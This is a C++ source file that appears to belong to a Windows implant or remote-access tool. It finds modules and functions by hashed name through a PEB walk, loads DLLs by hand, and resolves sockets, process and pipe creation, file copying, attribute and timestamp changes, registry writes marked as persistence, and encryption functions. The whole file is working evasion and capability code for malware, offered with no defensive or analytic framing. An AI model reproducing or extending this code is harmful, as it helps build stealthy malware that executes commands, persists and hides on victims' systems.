#include "Core/api_resolve.h"
#include <stdio.h>

extern "C" unsigned long long __readgsqword(unsigned long);


API_TABLE& GetAPI() {
    static API_TABLE instance = {0};
    return instance;
}

//get module by hash
PVOID GetModuleBaseByHash(QWORD targetHash) {
    PPEB peb = (PPEB)__readgsqword(0x60);

    PMY_PEB_LDR_DATA ldr = (PMY_PEB_LDR_DATA)peb->Ldr;

    PLIST_ENTRY moduleList = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY pEntry = moduleList->Flink;

    while (pEntry != moduleList) {
        PMY_LDR_DATA_TABLE_ENTRY pModule = (PMY_LDR_DATA_TABLE_ENTRY)pEntry;

        if (pModule->BaseDllName.Buffer != NULL) {
            char dllName[256];
            size_t i = 0;

            while (pModule->BaseDllName.Buffer[i] != L'\0' && i < 255) {
                char c = (char)pModule->BaseDllName.Buffer[i];
                if (c >= 'a' && c <= 'z') c -= 32;
                dllName[i] = c;
                i++;
            }
            dllName[i] = '\0';

            if (HashString(dllName) == targetHash) {
                return pModule->DllBase;
            }
        }
        pEntry = pEntry->Flink;
    }
    return NULL;
}

PVOID GetProcAddressByHash(HMODULE hModule, QWORD targetHash) {

    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    // Export Directory
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hModule + names[i]);
        if (HashString(name) == targetHash) {
            return (PVOID)((BYTE*)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}

bool ResolveAPIs() {

    API_TABLE& API = GetAPI();

    HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(0X158F8EF45363D375);
    if (!hKernel32) return false;

    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0XE1193D187E7EA30D);
    if (!hNtdll) return false;

    // find LdrLoadDll
    _LdrLoadDll pLdrLoadDll = (_LdrLoadDll)GetProcAddressByHash(hNtdll, 0X440A1FC572A1143);
    if (!pLdrLoadDll) return false;

    NTSTATUS status;

    //load Wininet (optional)
    wchar_t sWininet[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    UNICODE_STRING usWininet;
    SET_UNICODE_STRING(usWininet, sWininet);
    HMODULE hWininet_module = NULL;
    pLdrLoadDll(NULL, NULL, &usWininet, (PVOID*)&hWininet_module);

    //load WS2_32
    wchar_t sWs2[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    UNICODE_STRING usWs2;
    SET_UNICODE_STRING(usWs2, sWs2);
    HMODULE hWs2_module = NULL;
    status = pLdrLoadDll(NULL, NULL, &usWs2, (PVOID*)&hWs2_module);
    if (status != 0) return false;

    //load Advapi32.dll (optional)
    wchar_t sAdvapi32[] = { 'a','d','v','a','p','i','3','2','.','d','l','l','\0' };
    UNICODE_STRING usAdvapi32;
    SET_UNICODE_STRING(usAdvapi32, sAdvapi32);
    HMODULE hAdvapi32_module = NULL;
    pLdrLoadDll(NULL, NULL, &usAdvapi32, (PVOID*)&hAdvapi32_module);

    //load bcrypt.dll
    wchar_t sBcrypt[] = { 'b','c','r','y','p','t','.','d','l','l','\0' };
    UNICODE_STRING usBcrypt;
    SET_UNICODE_STRING(usBcrypt, sBcrypt);
    HMODULE hBcrypt_module = NULL;
    status = pLdrLoadDll(NULL, NULL, &usBcrypt, (PVOID*)&hBcrypt_module);
    if (status != 0) return false;

    // Resolve WinInet (optional)
    if (hWininet_module) {
        API.InternetOpenA        = (_InternetOpenA)       GetProcAddressByHash(hWininet_module, 0XB6B569938B3D72C1);
        API.InternetConnectA     = (_InternetConnectA)    GetProcAddressByHash(hWininet_module, 0X7079B096120DAF79);
        API.HttpOpenRequestA     = (_HttpOpenRequestA)    GetProcAddressByHash(hWininet_module, 0XD29BA903BEB70801);
        API.HttpSendRequestA     = (_HttpSendRequestA)    GetProcAddressByHash(hWininet_module, 0XD52F7CA45F0B63D9);
        API.InternetCloseHandle  = (_InternetCloseHandle) GetProcAddressByHash(hWininet_module, 0X2AAD7D931892D910);
    }

    // Resolve Winsock
    API.WSAStartup  = (_WSAStartup)  GetProcAddressByHash(hWs2_module, 0X4425AABB54AFCA3);
    API.socket      = (_socket)      GetProcAddressByHash(hWs2_module, 0XAD110306006D294E);
    API.inet_addr   = (_inet_addr)   GetProcAddressByHash(hWs2_module, 0XE11960AE1152AF4F);
    API.htons       = (_htons)       GetProcAddressByHash(hWs2_module, 0XD0083F86BDA5971);
    API.connect     = (_connect)     GetProcAddressByHash(hWs2_module, 0X4F3163C13F3737EF);
    API.recv        = (_recv)        GetProcAddressByHash(hWs2_module, 0X8C07C5F041596BB5);
    API.send        = (_send)        GetProcAddressByHash(hWs2_module, 0X8C07C5F04159F96F);
    API.closesocket = (_closesocket) GetProcAddressByHash(hWs2_module, 0X8CD3570721B5AB24);
    API.WSACleanup  = (_WSACleanup)  GetProcAddressByHash(hWs2_module, 0X4425AA6D33CE198);
    API.setsockopt  = (_setsockopt)  GetProcAddressByHash(hWs2_module, 0X447119DFC0E4894);
    API.WSAGetLastError = (_WSAGetLastError)    GetProcAddressByHash(hWs2_module, 0X759A3711B5D8C86E);

    //Resolve Kernel32
    API.CreateProcessA = (_CreateProcessA)      GetProcAddressByHash(hKernel32, 0XF856204117457439);
    API.CreateProcessW = (_CreateProcessW)      GetProcAddressByHash(hKernel32, 0XF85620411745744F);
    API.CreatePipe = (_CreatePipe)              GetProcAddressByHash(hKernel32, 0X43F3783EEB02507);
    API.ReadFile = (_ReadFile)                  GetProcAddressByHash(hKernel32, 0X355DDB3D54DFC741);
    API.CloseHandle = (_CloseHandle)            GetProcAddressByHash(hKernel32, 0X8C25383610D9C427);
    API.GetTickCount = (_GetTickCount)          GetProcAddressByHash(hKernel32, 0X137512EE273554D9);
    API.GetSystemInfo = (_GetSystemInfo)        GetProcAddressByHash(hKernel32, 0X82175B961998F216);
    API.GlobalMemoryStatusEx = (_GlobalMemoryStatusEx)  GetProcAddressByHash(hKernel32, 0XCAC446DB85267010);
    API.SetHandleInformation = (_SetHandleInformation)  GetProcAddressByHash(hKernel32, 0X342AC2D7115E8C23);
    API.CreateFileA = (_CreateFileA)                    GetProcAddressByHash(hKernel32, 0X8C262801C3FFC01A);
    API.CreateFileW = (_CreateFileW)                    GetProcAddressByHash(hKernel32, 0X8C262801C3FFC030);
    API.CopyFileW = (_CopyFileW)                        GetProcAddressByHash(hKernel32, 0XE11930200BC645F7);
    API.SetFileAttributesW = (_SetFileAttributesW)      GetProcAddressByHash(hKernel32, 0X7C2B6C531B2C5C8F);
    API.GetEnvironmentVariableW = (_GetEnvironmentVariableW)    GetProcAddressByHash(hKernel32, 0XF6795EA3F719C137);
    API.GetModuleFileNameW = (_GetModuleFileNameW)              GetProcAddressByHash(hKernel32, 0X134E66D9393EF783);
    API.GetSystemDirectoryW = (_GetSystemDirectoryW)            GetProcAddressByHash(hKernel32, 0X8D40C865BC94DE96);
    API.GetFileTime = (_GetFileTime)                            GetProcAddressByHash(hKernel32, 0X8C39D93E50FB49F4);
    API.SetFileTime = (_SetFileTime)                            GetProcAddressByHash(hKernel32, 0X8C7B24CC9153C900);
    API.GetCommandLineW = (_GetCommandLineW)                    GetProcAddressByHash(hKernel32, 0X59EC2D0F2FAB0683);
    API.SetErrorMode = (_SetErrorMode)                          GetProcAddressByHash(hKernel32, 0X1BDFBD727CE18400);
    API.AddVectoredExceptionHandler = (_AddVectoredExceptionHandler)    GetProcAddressByHash(hKernel32, 0XDCF5E375022B2AF7);
    API.ExitProcess = ( _ExitProcess)                                   GetProcAddressByHash(hKernel32, 0X8C320D028FD22DBE);
    API.CreateMutexW = (_CreateMutexW)                                  GetProcAddressByHash(hKernel32, 0X10EB283A55297043);
    API.GetProcessHeap = (_GetProcessHeap)                              GetProcAddressByHash(hKernel32, 0XC4F14E352EE85322);

    //Resolve Advapi32 (optional)
    if (hAdvapi32_module) {
        API.RegCreateKeyExW = (_RegCreateKeyExW)                    GetProcAddressByHash(hAdvapi32_module, 0X4665B486C167BDD4);
        API.RegSetValueExW = (_RegSetValueExW)                      GetProcAddressByHash(hAdvapi32_module, 0X8E1A02DF9CE8B920);
        API.RegCloseKey = (_RegCloseKey)                            GetProcAddressByHash(hAdvapi32_module, 0X8C75A3184BD43122);
        API.LookupAccountSidW= (_LookupAccountSidW)                 GetProcAddressByHash(hAdvapi32_module, 0X82948E141559F63);
    }
    

    //Resolve Bcrypt
    API.BCryptOpenAlgorithmProvider = (_BCryptOpenAlgorithmProvider)    GetProcAddressByHash(hBcrypt_module, 0X79B88177F46F19FD);
    API.BCryptCloseAlgorithmProvider = (_BCryptCloseAlgorithmProvider)  GetProcAddressByHash(hBcrypt_module, 0X5F27F9512514BE1);
    API.BCryptGenRandom = (_BCryptGenRandom)                            GetProcAddressByHash(hBcrypt_module, 0X8DB2C1E6B50CD054);
    API.BCryptImportKeyPair = (_BCryptImportKeyPair)                    GetProcAddressByHash(hBcrypt_module, 0XFF7160B3663B5BC9);
    API.BCryptGenerateSymmetricKey = (_BCryptGenerateSymmetricKey)      GetProcAddressByHash(hBcrypt_module, 0X5BA9E4E55127BD4A);
    API.BCryptEncrypt = (_BCryptEncrypt)                                GetProcAddressByHash(hBcrypt_module, 0XF67DEE4F619454BE);
    API.BCryptDecrypt = (_BCryptDecrypt)                                GetProcAddressByHash(hBcrypt_module, 0XF67DEE4EFF9BAA54);
    API.BCryptDestroyKey = (_BCryptDestroyKey)                          GetProcAddressByHash(hBcrypt_module, 0X440A805748D116EC);
    API.BCryptSetProperty = (_BCryptSetProperty)                        GetProcAddressByHash(hBcrypt_module, 0XC5AC29946E08B10A);
    API.BCryptGetProperty = (_BCryptGetProperty)                        GetProcAddressByHash(hBcrypt_module, 0XC56ADE062DB031FE);


    //Resolve ntdll 
    API.RtlAllocateHeap = (_RtlAllocateHeap)                    GetProcAddressByHash(hNtdll, 0X7A2E1A693B4C8BFA); 
    API.RtlFreeHeap = (_RtlFreeHeap)                            GetProcAddressByHash(hNtdll, 0X8C7822C749236BF7);


    // Capability flags for optional subsystems
    API.hasWinInet = hWininet_module && API.InternetOpenA && API.InternetConnectA
            && API.HttpOpenRequestA && API.HttpSendRequestA && API.InternetCloseHandle;

    API.hasPersistence = hAdvapi32_module && API.RegCreateKeyExW && API.RegSetValueExW
            && API.RegCloseKey && API.LookupAccountSidW;

    // Critical: Winsock
    if (!API.WSAStartup || !API.socket || !API.inet_addr || !API.htons || !API.connect
            || !API.recv || !API.send || !API.closesocket || !API.WSACleanup || !API.setsockopt
            || !API.WSAGetLastError)
        return false;

    // Critical: Kernel32
    if (!API.CreateProcessA || !API.CreateProcessW || !API.CreatePipe || !API.ReadFile
            || !API.CloseHandle || !API.GetTickCount || !API.GetSystemInfo || !API.GlobalMemoryStatusEx
            || !API.SetHandleInformation || !API.CreateFileA || !API.CreateFileW || !API.CopyFileW
            || !API.SetFileAttributesW || !API.GetEnvironmentVariableW || !API.GetModuleFileNameW
            || !API.GetSystemDirectoryW || !API.GetFileTime || !API.SetFileTime || !API.GetCommandLineW
            || !API.SetErrorMode || !API.AddVectoredExceptionHandler || !API.ExitProcess
            || !API.CreateMutexW || !API.GetProcessHeap)
        return false;

    // Critical: BCrypt
    if (!API.BCryptOpenAlgorithmProvider || !API.BCryptCloseAlgorithmProvider || !API.BCryptGenRandom
            || !API.BCryptImportKeyPair || !API.BCryptGenerateSymmetricKey || !API.BCryptEncrypt
            || !API.BCryptDecrypt || !API.BCryptDestroyKey || !API.BCryptSetProperty || !API.BCryptGetProperty)
        return false;

    // Critical: ntdll heap
    if (!API.RtlAllocateHeap || !API.RtlFreeHeap) return false;

    return true;
}
